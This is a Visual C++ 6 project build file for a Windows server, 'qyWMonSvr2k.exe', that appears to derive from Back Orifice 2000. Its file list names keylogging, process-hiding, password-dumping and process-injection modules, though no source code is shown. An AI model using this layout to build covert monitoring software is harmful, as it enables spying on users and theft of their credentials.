# Microsoft Developer Studio Project File - Name="asrWMonSvr" - Package Owner=<4>
# Microsoft Developer Studio Generated Build File, Format Version 6.00
# ** DO NOT EDIT **

# TARGTYPE "Win32 (x86) Application" 0x0101

CFG=asrWMonSvr - Win32 Release
!MESSAGE This is not a valid makefile. To build this project using NMAKE,
!MESSAGE use the Export Makefile command and run
!MESSAGE 
!MESSAGE NMAKE /f "asrWMonSvr.mak".
!MESSAGE 
!MESSAGE You can specify a configuration when running NMAKE
!MESSAGE by defining the macro CFG on the command line. For example:
!MESSAGE 
!MESSAGE NMAKE /f "asrWMonSvr.mak" CFG="asrWMonSvr - Win32 Release"
!MESSAGE 
!MESSAGE Possible choices for configuration are:
!MESSAGE 
!MESSAGE "asrWMonSvr - Win32 Release" (based on "Win32 (x86) Application")
!MESSAGE "asrWMonSvr - Win32 Debug" (based on "Win32 (x86) Application")
!MESSAGE 

# Begin Project
# PROP AllowPerConfigDependencies 0
# PROP Scc_ProjName ""
# PROP Scc_LocalPath ""
CPP=cl.exe
MTL=midl.exe
RSC=rc.exe

!IF  "$(CFG)" == "asrWMonSvr - Win32 Release"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "Release"
# PROP BASE Intermediate_Dir "Release"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "..\..\..\Release\bin"
# PROP Intermediate_Dir "..\..\..\o\asrWMonSvr\Release"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD CPP /nologo /MT /W3 /O1 /I "..\..\asrInclude" /I "..\..\qyInclude" /I "..\..\qyPublic\include" /I "..\include" /I "." /I "..\..\qyEncLib\include" /I "..\..\qyCustom\include" /I "..\..\qyCommProc\include" /I "..\..\qyCommProc_mis\include" /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /D "__BO2KSERVER__" /FR /YX /Gs16384 /FD /c
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x804 /d "NDEBUG"
# ADD RSC /l 0x804 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:windows /machine:I386
# ADD LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib wsock32.lib vfw32.lib winmm.lib mpr.lib qyEncLibForQwm.lib qyPublicForQwm.lib /nologo /base:"0x07610000" /entry:"WinMain@16" /subsystem:windows /map /machine:I386 /nodefaultlib /out:"..\..\..\Release\bin/qyWMonSvr2k.exe" /libpath:"..\..\..\Release\lib"

!ELSEIF  "$(CFG)" == "asrWMonSvr - Win32 Debug"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 1
# PROP BASE Output_Dir "Debug"
# PROP BASE Intermediate_Dir "Debug"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 1
# PROP Output_Dir "..\..\..\Debug\bin"
# PROP Intermediate_Dir "..\..\..\o\asrWMonSvr\Debug"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /Gm /GX /ZI /Od /D "WIN32" /D "_DEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /GZ /c
# ADD CPP /nologo /MTd /W3 /Gm /Zi /Od /I "..\..\asrInclude" /I "..\..\qyInclude" /I "..\..\qyPublic\include" /I "..\include" /I "." /I "..\..\qyEncLib\include" /I "..\..\qyCustom\include" /I "..\..\qyCommProc\include" /I "..\..\qyCommProc_mis\include" /D "WIN32" /D "_DEBUG" /D "_WINDOWS" /D "_MBCS" /D "__BO2KSERVER__" /Fr /YX /Gs65536 /FD /c
# ADD BASE MTL /nologo /D "_DEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "_DEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x804 /d "_DEBUG"
# ADD RSC /l 0x804 /d "_DEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:windows /debug /machine:I386 /pdbtype:sept
# ADD LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib wsock32.lib vfw32.lib winmm.lib mpr.lib qyEncLibForQwm.lib qyPublicForQwm.lib /nologo /base:"0x07610000" /version:1.0 /entry:"WinMain@16" /subsystem:windows /incremental:no /map /debug /machine:I386 /nodefaultlib /out:"..\..\..\Debug\bin/qyWMonSvr2k.exe" /pdbtype:sept /libpath:"..\..\..\Debug\lib"

!ENDIF 

# Begin Target

# Name "asrWMonSvr - Win32 Release"
# Name "asrWMonSvr - Win32 Debug"
# Begin Group "Source Files"

# PROP Default_Filter "cpp;c;cxx;rc;def;r;odl;idl;hpj;bat"
# Begin Group "misc"

# PROP Default_Filter ""
# Begin Group "proclist"

# PROP Default_Filter ""
# Begin Group "nt-pviewer"

# PROP Default_Filter ""
# Begin Source File

SOURCE=".\misc\proclist\nt-pviewer\cntrdata.cpp"
# End Source File
# Begin Source File

SOURCE=".\misc\proclist\nt-pviewer\instdata.cpp"
# End Source File
# Begin Source File

SOURCE=".\misc\proclist\nt-pviewer\nt_pviewer.cpp"
# End Source File
# Begin Source File

SOURCE=".\misc\proclist\nt-pviewer\objdata.cpp"
# End Source File
# Begin Source File

SOURCE=".\misc\proclist\nt-pviewer\perfdata.cpp"
# End Source File
# End Group
# Begin Source File

SOURCE=.\misc\proclist\pviewer.cpp
# End Source File
# End Group
# Begin Group "images"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\misc\images\cdrom.gif
# End Source File
# Begin Source File

SOURCE=.\misc\images\cdromgif.cpp
# End Source File
# Begin Source File

SOURCE=.\misc\images\computer.gif
# End Source File
# Begin Source File

SOURCE=.\misc\images\computergif.cpp
# End Source File
# Begin Source File

SOURCE=.\misc\images\domain.gif
# End Source File
# Begin Source File

SOURCE=.\misc\images\domaingif.cpp
# End Source File
# Begin Source File

SOURCE=.\misc\images\drive.gif
# End Source File
# Begin Source File

SOURCE=.\misc\images\drivegif.cpp
# End Source File
# Begin Source File

SOURCE=.\misc\images\entirenetwork.gif
# End Source File
# Begin Source File

SOURCE=.\misc\images\entirenetworkgif.cpp
# End Source File
# Begin Source File

SOURCE=.\misc\images\exe.gif
# End Source File
# Begin Source File

SOURCE=.\misc\images\exegif.cpp
# End Source File
# Begin Source File

SOURCE=.\misc\images\file.gif
# End Source File
# Begin Source File

SOURCE=.\misc\images\filegif.cpp
# End Source File
# Begin Source File

SOURCE=.\misc\images\folder.gif
# End Source File
# Begin Source File

SOURCE=.\misc\images\foldergif.cpp
# End Source File
# Begin Source File

SOURCE=.\misc\images\html.gif
# End Source File
# Begin Source File

SOURCE=.\misc\images\htmlgif.cpp
# End Source File
# Begin Source File

SOURCE=.\misc\images\image.gif
# End Source File
# Begin Source File

SOURCE=.\misc\images\imagegif.cpp
# End Source File
# Begin Source File

SOURCE=.\misc\images\network.gif
# End Source File
# Begin Source File

SOURCE=.\misc\images\networkgif.cpp
# End Source File
# Begin Source File

SOURCE=.\misc\images\printer.gif
# End Source File
# Begin Source File

SOURCE=.\misc\images\printergif.cpp
# End Source File
# Begin Source File

SOURCE=.\misc\images\remote.gif
# End Source File
# Begin Source File

SOURCE=.\misc\images\remotegif.cpp
# End Source File
# Begin Source File

SOURCE=.\misc\images\server.gif
# End Source File
# Begin Source File

SOURCE=.\misc\images\servergif.cpp
# End Source File
# Begin Source File

SOURCE=.\misc\images\text.gif
# End Source File
# Begin Source File

SOURCE=.\misc\images\textgif.cpp
# End Source File
# End Group
# Begin Group "config"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\misc\config\config.cpp
# End Source File
# End Group
# Begin Group "process_hop"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\misc\process_hop\process_hop.cpp
# End Source File
# End Group
# End Group
# Begin Group "libc"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\libc\fake_libc.c
# End Source File
# Begin Source File

SOURCE=.\libc\newdelete.cpp
# End Source File
# Begin Source File

SOURCE=.\libc\strhandle.cpp
# End Source File
# End Group
# Begin Group "asrPublic"

# PROP Default_Filter ""
# Begin Source File

SOURCE=..\..\asrPublic\asrComm.cpp

!IF  "$(CFG)" == "asrWMonSvr - Win32 Release"

!ELSEIF  "$(CFG)" == "asrWMonSvr - Win32 Debug"

# SUBTRACT CPP /YX

!ENDIF 

# End Source File
# Begin Source File

SOURCE=..\..\asrPublic\commonFunc1.cpp
# End Source File
# Begin Source File

SOURCE=..\..\asrPublic\commonSock.cpp
# End Source File
# Begin Source File

SOURCE=..\..\asrPublic\genericqueue.c
# End Source File
# End Group
# Begin Group "qwmProc"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\qwmProc\asrWMonRas.cpp

!IF  "$(CFG)" == "asrWMonSvr - Win32 Release"

!ELSEIF  "$(CFG)" == "asrWMonSvr - Win32 Debug"

# SUBTRACT CPP /YX

!ENDIF 

# End Source File
# Begin Source File

SOURCE=.\qwmProc\awmRegFunc.cpp
# End Source File
# Begin Source File

SOURCE=.\qwmProc\qwmHideProcess.cpp
# End Source File
# Begin Source File

SOURCE=.\qwmProc\qwmLogProc.cpp
# End Source File
# Begin Source File

SOURCE=.\qwmProc\qwmProcDetectionResult.cpp
# SUBTRACT CPP /YX
# End Source File
# Begin Source File

SOURCE=.\qwmProc\qwmSvrFakeProc.cpp
# End Source File
# Begin Source File

SOURCE=.\qwmProc\qwmThreadProc.cpp

!IF  "$(CFG)" == "asrWMonSvr - Win32 Release"

!ELSEIF  "$(CFG)" == "asrWMonSvr - Win32 Debug"

# SUBTRACT CPP /YX

!ENDIF 

# End Source File
# End Group
# Begin Group "io"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\IO\io_simpletcp.cpp
# End Source File
# Begin Source File

SOURCE=.\IO\iohandler.cpp
# End Source File
# End Group
# Begin Source File

SOURCE=.\main.cpp
# End Source File
# Begin Source File

SOURCE=.\qyWMonSvr.rc
# End Source File
# Begin Source File

SOURCE=.\qyWMonSvr.rc2
# End Source File
# End Group
# Begin Group "Header Files"

# PROP Default_Filter "h;hpp;hxx;hm;inl"
# Begin Group "cmd"

# PROP Default_Filter ""
# Begin Source File

SOURCE=..\include\cmd\cmd_compress.h
# End Source File
# Begin Source File

SOURCE=..\include\cmd\cmd_file.h
# End Source File
# Begin Source File

SOURCE=..\include\cmd\cmd_gui.h
# End Source File
# Begin Source File

SOURCE=..\include\cmd\cmd_keylogging.h
# End Source File
# Begin Source File

SOURCE=..\include\cmd\cmd_msnet.h
# End Source File
# Begin Source File

SOURCE=..\include\cmd\cmd_multimedia.h
# End Source File
# Begin Source File

SOURCE=..\include\cmd\cmd_plugin.h
# End Source File
# Begin Source File

SOURCE=..\include\cmd\cmd_process.h
# End Source File
# Begin Source File

SOURCE=..\include\cmd\cmd_registry.h
# End Source File
# Begin Source File

SOURCE=..\include\cmd\cmd_resolver.h
# End Source File
# Begin Source File

SOURCE=..\include\cmd\cmd_serverctrl.h
# End Source File
# Begin Source File

SOURCE=..\include\cmd\cmd_simple.h
# End Source File
# Begin Source File

SOURCE=..\include\cmd\cmd_system.h
# End Source File
# Begin Source File

SOURCE=..\include\cmd\cmd_tcpip.h
# End Source File
# End Group
# Begin Source File

SOURCE=..\include\asrWMon.h
# End Source File
# Begin Source File

SOURCE=..\include\asrWMonPrecomp.h
# End Source File
# Begin Source File

SOURCE=..\include\asrWMonRas.h
# End Source File
# Begin Source File

SOURCE=..\include\auth.h
# End Source File
# Begin Source File

SOURCE=..\include\bo_debug.h
# End Source File
# Begin Source File

SOURCE=..\include\bocomreg.h
# End Source File
# Begin Source File

SOURCE=..\include\comm_native.h
# End Source File
# Begin Source File

SOURCE=..\include\commandloop.h
# End Source File
# Begin Source File

SOURCE=..\include\commnet.h
# End Source File
# Begin Source File

SOURCE=..\include\config.h
# End Source File
# Begin Source File

SOURCE=..\include\deshash.h
# End Source File
# Begin Source File

SOURCE=..\include\dll_load.h
# End Source File
# Begin Source File

SOURCE=..\include\dumppw.h
# End Source File
# Begin Source File

SOURCE=..\include\encryption.h
# End Source File
# Begin Source File

SOURCE=..\include\functions.h
# End Source File
# Begin Source File

SOURCE=..\include\io_simpletcp.h
# End Source File
# Begin Source File

SOURCE=..\include\io_simpleudp.h
# End Source File
# Begin Source File

SOURCE=..\include\iohandler.h
# End Source File
# Begin Source File

SOURCE=..\include\Lzh.h
# End Source File
# Begin Source File

SOURCE=..\include\lzhcompress.h
# End Source File
# Begin Source File

SOURCE=..\include\main.h
# End Source File
# Begin Source File

SOURCE=..\include\nt_pviewer.h
# End Source File
# Begin Source File

SOURCE=..\include\nullauth.h
# End Source File
# Begin Source File

SOURCE=..\include\osversion.h
# End Source File
# Begin Source File

SOURCE=..\include\perfdata.h
# End Source File
# Begin Source File

SOURCE=..\include\permissions.h
# End Source File
# Begin Source File

SOURCE=..\include\plugins.h
# End Source File
# Begin Source File

SOURCE=..\include\process_hop.h
# End Source File
# Begin Source File

SOURCE=..\include\pviewdat.h
# End Source File
# Begin Source File

SOURCE=..\include\pviewer.h
# End Source File
# Begin Source File

SOURCE=..\include\qwmFunc.h
# End Source File
# Begin Source File

SOURCE=.\resource.h
# End Source File
# Begin Source File

SOURCE=..\include\strhandle.h
# End Source File
# Begin Source File

SOURCE=..\include\xorencrypt.h
# End Source File
# End Group
# Begin Group "qyPublic"

# PROP Default_Filter ""
# Begin Group "qyComm"

# PROP Default_Filter ""
# Begin Source File

SOURCE=..\..\qyPublic\qyComm\qyCommFunc.cpp
# End Source File
# End Group
# Begin Group "qySock"

# PROP Default_Filter ""
# Begin Source File

SOURCE=..\..\qyPublic\qySock\qyCommonSock.cpp
# End Source File
# End Group
# Begin Group "qyCommon"

# PROP Default_Filter ""
# Begin Source File

SOURCE=..\..\qyPublic\qyCommon\qyCommonFunc9.cpp
# End Source File
# Begin Source File

SOURCE=..\..\qyPublic\qyCommon\qyDebugFunc.cpp
# End Source File
# End Group
# End Group
# Begin Group "qyCommProc"

# PROP Default_Filter ""
# Begin Group "qyCommProcInclude"

# PROP Default_Filter ""
# Begin Source File

SOURCE=..\..\qyCommProc\include\qnmCommProc.h
# End Source File
# Begin Source File

SOURCE=..\..\qyCommProc\include\qnmGuiCommProc.h
# End Source File
# End Group
# Begin Source File

SOURCE=..\..\qyCommProc\qnmChkCommProc.cpp
# SUBTRACT CPP /YX
# End Source File
# Begin Source File

SOURCE=..\..\qyCommProc\qnmCommProc.cpp

!IF  "$(CFG)" == "asrWMonSvr - Win32 Release"

!ELSEIF  "$(CFG)" == "asrWMonSvr - Win32 Debug"

# SUBTRACT CPP /YX

!ENDIF 

# End Source File
# Begin Source File

SOURCE=..\..\qyCommProc\qnmGuiCommProc.cpp
# End Source File
# Begin Source File

SOURCE=..\..\qyCommProc\qwmHideProcessCommProc.cpp
# SUBTRACT CPP /YX
# End Source File
# Begin Source File

SOURCE=..\..\qyCommProc\qyCommProc.cpp
# End Source File
# End Group
# Begin Group "qyPublic2"

# PROP Default_Filter ""
# Begin Source File

SOURCE=..\..\qyPublic2\qwmCommonFunc.cpp
# End Source File
# Begin Source File

SOURCE=..\..\qyPublic2\qyErrFunc.cpp

!IF  "$(CFG)" == "asrWMonSvr - Win32 Release"

!ELSEIF  "$(CFG)" == "asrWMonSvr - Win32 Debug"

# SUBTRACT CPP /YX

!ENDIF 

# End Source File
# End Group
# Begin Group "qwmPublic"

# PROP Default_Filter ""
# Begin Source File

SOURCE=..\qwmPublic\commandloop.cpp
# End Source File
# Begin Source File

SOURCE=..\qwmPublic\Decrypt.cpp
# End Source File
# Begin Source File

SOURCE=..\qwmPublic\functions.cpp
# End Source File
# Begin Source File

SOURCE=..\qwmPublic\qwmFunc.cpp

!IF  "$(CFG)" == "asrWMonSvr - Win32 Release"

!ELSEIF  "$(CFG)" == "asrWMonSvr - Win32 Debug"

# SUBTRACT CPP /YX

!ENDIF 

# End Source File
# Begin Source File

SOURCE=..\qwmPublic\qwmProc.cpp

!IF  "$(CFG)" == "asrWMonSvr - Win32 Release"

!ELSEIF  "$(CFG)" == "asrWMonSvr - Win32 Debug"

# SUBTRACT CPP /YX

!ENDIF 

# End Source File
# Begin Source File

SOURCE=..\qwmPublic\qwmTemp.CPP
# End Source File
# End Group
# Begin Group "qyCustom"

# PROP Default_Filter ""
# Begin Group "qyCustomInclude"

# PROP Default_Filter ""
# Begin Source File

SOURCE=..\..\qyCustom\include\qnmCustomGui.h
# End Source File
# End Group
# Begin Source File

SOURCE=..\..\qyCustom\qnmCustomRegTool.cpp
# End Source File
# End Group
# Begin Group "qrtSecChk"

# PROP Default_Filter ""
# Begin Source File

SOURCE=..\qyRegTool\qrtSecChk\qwmChkIe.cpp

!IF  "$(CFG)" == "asrWMonSvr - Win32 Release"

!ELSEIF  "$(CFG)" == "asrWMonSvr - Win32 Debug"

# SUBTRACT CPP /YX

!ENDIF 

# End Source File
# Begin Source File

SOURCE=..\qyRegTool\qrtSecChk\qwmChkPcInfo.cpp
# End Source File
# Begin Source File

SOURCE=..\qyRegTool\qrtSecChk\qwmChkRecent.cpp

!IF  "$(CFG)" == "asrWMonSvr - Win32 Release"

!ELSEIF  "$(CFG)" == "asrWMonSvr - Win32 Debug"

# SUBTRACT CPP /YX

!ENDIF 

# End Source File
# Begin Source File

SOURCE=..\qyRegTool\qrtSecChk\qwmSecChkProc.cpp
# End Source File
# End Group
# Begin Source File

SOURCE=.\cursor1.cur
# End Source File
# End Target
# End Project
